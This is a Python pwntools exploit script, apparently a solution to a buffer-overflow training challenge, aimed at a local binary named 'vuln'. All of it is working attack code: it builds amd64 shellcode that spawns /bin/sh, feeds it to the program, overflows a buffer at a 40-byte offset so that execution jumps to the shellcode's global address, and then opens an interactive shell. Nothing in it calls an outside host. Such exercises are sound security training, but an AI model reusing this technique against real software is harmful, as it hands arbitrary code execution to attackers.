#!/usr/bin/env python

from pwn import *

exec_path = "../../09-challenge-buffer-overflow-shellcode/src/vuln"
context.binary = exec_path
e = ELF(exec_path)
io = process(exec_path)

log.info("context is: " + str(vars(context)))

# Create x86_64 bit exec shellcode.
shellcode_asm = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode_asm)
log.info("shellcode_asm is: \n" + shellcode_asm)
log.info("shellcode is: {}".format("".join("\\x{:02x}".format(ord(b)) for b in shellcode)))

# Determine this with GDB PEDA + pattc + patto.
offset = 40

# Address of global variable storing the shellcode.
shellcode_address = e.symbols["shellcode"]

# Create payload.
payload = "A" * offset + pack(shellcode_address)

# Feed shellcode as input to program.
io.sendline(shellcode)

# Feed payload to trigger overflow and call shellcode.
io.sendline(payload)

# Profit! Use interactive shell and run shell commands.
io.interactive()
